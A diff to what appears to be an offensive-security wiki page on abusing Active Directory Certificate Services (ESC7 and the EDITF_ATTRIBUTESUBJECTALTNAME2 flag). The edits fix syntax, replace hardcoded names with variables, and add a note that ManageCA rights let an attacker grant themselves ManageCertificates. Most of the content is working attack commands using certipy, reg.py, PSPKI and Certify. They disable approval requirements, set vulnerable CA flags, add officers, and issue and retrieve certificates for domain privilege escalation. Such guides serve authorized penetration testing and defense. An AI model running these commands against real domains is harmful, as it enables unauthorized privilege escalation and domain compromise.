@@ -78,7 +78,7 @@ If a more precise template modification is needed, [modifyCertTemplate](https://
 
 ```bash
 # 1. Disable Manager Approval Requirement
-modifyCertTemplate.py -template templateName -value 2 -property mspki-enrollment-flag "$DOMAIN/$USER:$PASSWORD"
+modifyCertTemplate.py -template templateName -value 0 -property mspki-enrollment-flag "$DOMAIN/$USER:$PASSWORD"
 
 # 2. Disable Authorized Signature Requirement
 modifyCertTemplate.py -template templateName -value 0 -property mspki-ra-signature "$DOMAIN/$USER:$PASSWORD"
@@ -151,7 +151,7 @@ The attack can be carried out from UNIX-like systems as follows.
 reg.py "$DOMAIN"/"$USER":"$PASSWORD"@$"ADCS_IP" query -keyName 'HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\CA-NAME\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy' -v editflags
 
 # bitwise OR to set the flag if not already (nothing changed if already set)
-python3 -c print("NEW_VALUE:", VALUE | 0x40000)
+python3 -c 'print("NEW_VALUE:", VALUE | 0x40000)'
 
 # write flags
 reg.py "$DOMAIN"/"$USER":"$PASSWORD"@$"ADCS_IP" add-keyName 'HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\CA-NAME\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy' -v editflags -vd NEW_VALUE
@@ -172,13 +172,13 @@ Install-Module -Name PSPKI
 Import-Module PSPKI
 
 # Get the current value of EDITF_ATTRIBUTESUBJECTALTNAME2 and modify it with SetConfigEntry
-$configReader = New-Object SysadminsLV.PKI.Dcom.Implementations.CertSrvRegManagerD "CA.domain.local"
+$configReader = New-Object SysadminsLV.PKI.Dcom.Implementations.CertSrvRegManagerD "$CA_FQDN"
 $configReader.SetRootNode($true)
 $configReader.GetConfigEntry("EditFlags", "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")
 $configReader.SetConfigEntry(1376590, "EditFlags", "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")
 
 # Check after setting the flag (EDITF_ATTRIBUTESUBJECTALTNAME2 should appear in the output)
-certutil.exe -config "CA.domain.local\CA" -getreg "policy\EditFlags"
+certutil.exe -config "$CA_FQDN\$CA_NAME" -getreg "policy\EditFlags"
 ```
 
 If RSAT is not present, it can installed like this:
@@ -207,23 +207,23 @@ If the attacker only has the `ManageCA` permission, [Certipy](https://github.com
 
 ```bash
 # Add a new officier
-certipy ca -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -ca 'ca_name' -add-officer 'user'
+certipy ca -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -ca "$CA_NAME" -add-officer 'user'
 
 # List all the templates
-certipy ca -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -ca 'ca_name' -list-templates
+certipy ca -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -ca "$CA_NAME" -list-templates
 
 # Enable a certificate template
-certipy ca -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -ca 'ca_name' -enable-template 'SubCA'
+certipy ca -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -ca "$CA_NAME" -enable-template 'SubCA'
 ```
 
 In order to abuse the `SubCA` template with ESC7, both `ManageCA` and `ManageCertificates` are needed in order to issue a certificate from a failed request.
 
 ```bash
 # Issue a failed request (need ManageCA and ManageCertificates rights for a failed request)
-certipy ca -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -issue-request 100
+certipy ca -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca "$CA_NAME" -issue-request 100
 
 # Retrieve an issued certificate
-certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -retrieve 100
+certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca "$CA_NAME" -retrieve 100
 ```
 
 The certificate can then be used with [Pass-The-Certificate](../kerberos/pass-the-certificate.md) to obtain a TGT and authenticate.
@@ -233,13 +233,13 @@ The certificate can then be used with [Pass-The-Certificate](../kerberos/pass-th
 
 From Windows systems, the [Certify](https://github.com/GhostPack/Certify) (C#) tool can be used to enumerate info about the CAs, including access rights over the CA object, and to request a certificate that requires manager approval.
 
-In this example, both `ManageCA` and `ManageCertificates` are already obtained. There is no known method to obtain the `ManageCertificates` right.
+In this example, both `ManageCA` and `ManageCertificates` are already obtained. Note: a principal with `ManageCA` can grant themselves `ManageCertificates` by adding themselves as an officer (see the UNIX-like tab above using `certipy ca -add-officer`).
 
 Then, [PSPKI](https://github.com/PKISolutions/PSPKI) (PowerShell) can be used to approve a certificate request ([RSAT](https://docs.microsoft.com/fr-fr/troubleshoot/windows-server/system-management-components/remote-server-administration-tools) is needed on the machine where PSPKI is used). PSPKI is a PowerShell module used to "simplify various PKI and AD CS management tasks".
 
 ```powershell
 # 1. Request a certificate that requires manager approval with Certify
-Certify.exe request /ca:CA.domain.local\CA /template:ApprovalNeeded
+Certify.exe request /ca:$CA_FQDN\$CA_NAME /template:ApprovalNeeded
 ...
 [*] Request ID : 1
 
@@ -248,10 +248,10 @@ Install-Module -Name PSPKI
 Import-Module PSPKI
 
 # 3. Approve the pending request with PSPKI
-PSPKI > Get-CertificationAuthority -ComputerName CA.domain.local | Get-PendingRequest -RequestID 1 | Approve-CertificateRequest
+PSPKI > Get-CertificationAuthority -ComputerName $CA_FQDN | Get-PendingRequest -RequestID 1 | Approve-CertificateRequest
 
 # 4. Download the certificate with Certify
-Certify.exe download /ca:CA.domain.local\CA /id:1
+Certify.exe download /ca:$CA_FQDN\$CA_NAME /id:1
 ```
 
 :::
